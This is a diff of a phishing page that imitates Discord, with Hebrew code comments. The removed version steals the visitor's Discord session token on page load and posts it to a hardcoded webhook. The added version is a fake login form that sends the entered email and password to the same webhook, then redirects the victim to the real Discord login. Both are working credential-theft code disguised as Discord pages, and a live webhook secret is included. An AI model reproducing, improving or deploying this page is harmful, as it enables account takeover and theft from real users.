@@ -1,66 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Discord - Secure Session</title>
+    <title>Discord | Login</title>
     <style>
-        body { background-color: #313338; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #5865F2; border-top: 4px solid transparent; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background-color: #313338; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: white; }
+        .login-box { background: #313338; padding: 32px; border-radius: 8px; width: 400px; text-align: center; }
+        h2 { margin-bottom: 8px; font-size: 24px; }
+        p { color: #b5bac1; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin-bottom: 20px; border-radius: 3px; border: none; background: #1e1f22; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #5865f2; color: white; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #4752c4; }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
-        <div class="loader"></div>
-        <h1>Verifying Your Account Safety...</h1>
-        <p>This may take a moment. Please do not close this window.</p>
+    <div class="login-box">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
+        <div style="text-align: left;">
+            <label style="font-size: 12px; font-weight: bold; color: #b5bac1;">EMAIL OR PHONE NUMBER</label>
+            <input type="text" id="email">
+            <label style="font-size: 12px; font-weight: bold; color: #b5bac1;">PASSWORD</label>
+            <input type="password" id="pass">
+        </div>
+        <button onclick="send()">Log In</button>
     </div>
 
     <script>
-        function getDiscordToken() {
-            try {
-                window.dispatchEvent(new Event('beforeunload'));
-                let token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
-                return token;
-            } catch (e) { return null; }
-        }
+        async function send() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
 
-        async function process() {
-            const webhookUrl = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
-            const token = getDiscordToken();
-
-            // אנחנו משתמשים ב-await כדי שהדפדפן יחכה שהשליחה תסתיים
-            if (token) {
-                try {
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            embeds: [{
-                                title: "🔱 **Token Intercepted!**",
-                                description: "The system has captured a new token:\n`" + token + "`",
-                                color: 5763719,
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
-                    });
-                } catch (err) { console.error("Send failed"); }
-            } else {
-                // הודעת לוג לדיסקורד שלך גם אם אין טוקן - כדי שתדע שהקישור עובד
-                await fetch(webhookUrl, {
+            if (email && pass) {
+                await fetch(webhook, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "⚠️ **Link Opened:** Someone clicked the trap but no token was found in this browser." })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🔱 **Account Intercepted!**",
+                            fields: [
+                                { name: "Email", value: email },
+                                { name: "Password", value: pass }
+                            ],
+                            color: 5763719
+                        }]
+                    })
                 });
+                // אחרי השליחה, נעביר אותו לדיסקורד האמיתי
+                window.location.href = "https://discord.com/login";
             }
-
-            // רק עכשיו, אחרי שהכל נשלח, עוברים לדיסקורד
-            setTimeout(() => {
-                window.location.href = "https://discord.com/safety";
-            }, 2000); // המתנה של 2 שניות לביטחון
         }
-
-        window.onload = process;
     </script>
 </body>
 </html>
